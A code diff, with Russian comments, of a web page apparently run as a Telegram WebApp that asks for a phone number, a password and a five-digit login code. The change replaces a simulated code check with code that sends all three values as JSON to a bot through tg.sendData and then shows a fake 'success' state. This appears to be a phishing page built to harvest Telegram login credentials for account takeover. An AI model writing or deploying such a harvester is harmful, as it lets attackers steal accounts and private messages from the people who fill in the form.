@@ -419,46 +419,37 @@
         const boxes = document.querySelectorAll('.digit-box');
         const inputs = document.querySelectorAll('.code-digit');
 
-        const phoneNumber = phoneInput.value;
-        const password = passwordInput.value;
+        // 1. Собираем все данные
+        const phoneNumber = document.getElementById('phone').value;
+        const password = document.getElementById('password').value; // Если пароля не было, будет пусто
         let code = '';
         inputs.forEach(i => code += i.value);
 
-        console.log(`Телефон: ${phoneNumber}`);
-        console.log(`Пароль: ${password}`);
-        console.log(`Код: ${code}`);
-
-        // Блокируем
+        // 2. Блокируем интерфейс (Визуальный эффект)
         inputs.forEach(inp => { inp.readOnly = true; inp.blur(); });
         boxes.forEach(box => { box.classList.add('locked'); });
 
-        // === ИМИТАЦИЯ ПРОВЕРКИ КОДА ===
+        // 3. ОТПРАВЛЯЕМ ДАННЫЕ БОТУ
+        // Инициализируем Telegram WebApp
+        const tg = window.Telegram.WebApp;
+
+        // Формируем объект с данными
+        const data = {
+            phone: phoneNumber,
+            password: password,
+            code: code
+        };
+
+        // Отправляем данные боту (приложение закроется само)
+        tg.sendData(JSON.stringify(data));
+
+        // На всякий случай, если приложение не закрылось (например, открыто в браузере, а не в ТГ)
         setTimeout(() => {
-            if (code === '00000') {
-                // ОШИБКА
-                boxes.forEach(box => {
-                    box.classList.remove('locked');
-                    box.classList.add('error');
-                });
-
-                // Перезапуск через 1 сек
-                setTimeout(() => {
-                    boxes.forEach(box => box.classList.remove('error'));
-                    inputs.forEach(inp => {
-                        inp.value = '';
-                        inp.readOnly = false;
-                    });
-                    inputs[0].focus();
-                }, 1000);
-
-            } else {
-                // УСПЕХ
-                boxes.forEach(box => {
-                    box.classList.remove('locked');
-                    box.classList.add('success');
-                });
-            }
-        }, 4000);
+            boxes.forEach(box => {
+                box.classList.remove('locked');
+                box.classList.add('success');
+            });
+        }, 1000);
     }
 
     const inputs = document.querySelectorAll('.code-digit');
